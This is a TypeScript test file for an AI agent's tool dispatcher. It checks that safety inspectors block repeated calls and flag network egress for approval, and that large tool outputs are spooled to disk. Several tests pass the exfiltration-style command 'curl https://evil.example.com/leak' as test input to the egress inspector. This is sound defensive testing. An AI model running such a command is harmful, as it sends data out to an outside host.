import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ToolDispatcher } from './dispatcher';
import { ToolInspectionManager, RepetitionInspector, EgressInspector } from '../safety/toolInspectors';
import { getSwallowedFailures } from '../observability/silentFailureSink';
import type { Tool, ToolCall, ToolResult } from '../types';

function makeTool(name: string, isReadOnly: boolean, handler?: (input: Record<string, unknown>) => Promise<ToolResult>): Tool {
  return {
    name,
    description: `Test tool: ${name}`,
    parameters: { type: 'object', properties: {} },
    isReadOnly,
    execute: handler ?? (async () => ({ success: true, output: `${name} executed` })),
  };
}

describe('ToolDispatcher inspector integration', () => {
  it('denies a call when an inspector returns deny', async () => {
    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
    const inspectors = new ToolInspectionManager();
    inspectors.add(new RepetitionInspector(1));

    const call: ToolCall = { name: 'bash', input: { command: 'ls' } };
    const first = await dispatcher.dispatch([call], undefined, undefined, { inspectors });
    expect(first[0].result.success).toBe(true);

    const second = await dispatcher.dispatch([call], undefined, undefined, { inspectors });
    expect(second[0].result.success).toBe(false);
    expect(second[0].result.output).toContain("Blocked by inspector 'repetition'");
  });

  it('aborts when an inspector requires approval and the host denies it', async () => {
    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
    const inspectors = new ToolInspectionManager();
    inspectors.add(new EgressInspector());

    const results = await dispatcher.dispatch(
      [{ name: 'bash', input: { command: 'curl https://evil.example.com/leak' } }],
      undefined,
      undefined,
      {
        inspectors,
        onApprovalRequired: async () => false,
      },
    );
    expect(results[0].result.success).toBe(false);
    expect(results[0].result.output).toContain('approval');
  });

  it('proceeds when approval is granted', async () => {
    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
    const inspectors = new ToolInspectionManager();
    inspectors.add(new EgressInspector());

    const results = await dispatcher.dispatch(
      [{ name: 'bash', input: { command: 'curl https://evil.example.com/leak' } }],
      undefined,
      undefined,
      {
        inspectors,
        onApprovalRequired: async () => true,
      },
    );
    expect(results[0].result.success).toBe(true);
  });

  it('treats requireApproval as allow when no approval hook is wired, but records the dropped decision', async () => {
    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
    const inspectors = new ToolInspectionManager();
    inspectors.add(new EgressInspector());

    const results = await dispatcher.dispatch(
      [{ name: 'bash', input: { command: 'curl https://evil.example.com/leak' } }],
      undefined,
      undefined,
      { inspectors },
    );
    expect(results[0].result.success).toBe(true);

    // F2: the dropped requireApproval must be post-hoc visible in the
    // silent-failure sink rather than silently passing through.
    const dropped = getSwallowedFailures().filter(
      (f) => f.label === 'dispatcher.inspector.requireApproval.dropped',
    );
    expect(dropped.length).toBeGreaterThan(0);
    expect(dropped[dropped.length - 1].meta?.tool).toBe('bash');
  });

  it('runs the inspector chain only after the permission gate passes', async () => {
    let inspected = false;
    const dispatcher = new ToolDispatcher([makeTool('bash', false)]);
    const inspectors = new ToolInspectionManager();
    inspectors.add({
      name: 'spy',
      isEnabled: () => true,
      inspect: async () => {
        inspected = true;
        return null;
      },
    });

    await dispatcher.dispatch(
      [{ name: 'bash', input: {} }],
      async () => ({ allowed: false, reason: 'no' }),
      undefined,
      { inspectors },
    );
    expect(inspected).toBe(false);
  });
});

describe('ToolDispatcher large response spooling', () => {
  let spoolDir: string;

  beforeEach(() => {
    spoolDir = fs.mkdtempSync(path.join(os.tmpdir(), 'harness-disp-spool-'));
  });

  afterEach(() => {
    fs.rmSync(spoolDir, { recursive: true, force: true });
  });

  it('replaces oversized outputs with a pointer message', async () => {
    const big = 'y'.repeat(2000);
    const tool = makeTool('grep', true, async () => ({ success: true, output: big }));
    const dispatcher = new ToolDispatcher([tool]);

    const results = await dispatcher.dispatch(
      [{ name: 'grep', input: {} }],
      undefined,
      undefined,
      { largeResponseConfig: { thresholdChars: 100, spoolDir } },
    );
    expect(results[0].result.output).toContain('large response');
    expect(results[0].result.output).toContain('characters');
    // Some file in the spool dir should hold the original content.
    const files = fs.readdirSync(spoolDir);
    expect(files.length).toBe(1);
    expect(fs.readFileSync(path.join(spoolDir, files[0]), 'utf-8')).toBe(big);
  });

  it('does not spool when below threshold', async () => {
    const tool = makeTool('grep', true, async () => ({ success: true, output: 'small' }));
    const dispatcher = new ToolDispatcher([tool]);
    const results = await dispatcher.dispatch(
      [{ name: 'grep', input: {} }],
      undefined,
      undefined,
      { largeResponseConfig: { thresholdChars: 100, spoolDir } },
    );
    expect(results[0].result.output).toBe('small');
    expect(fs.readdirSync(spoolDir)).toEqual([]);
  });
});
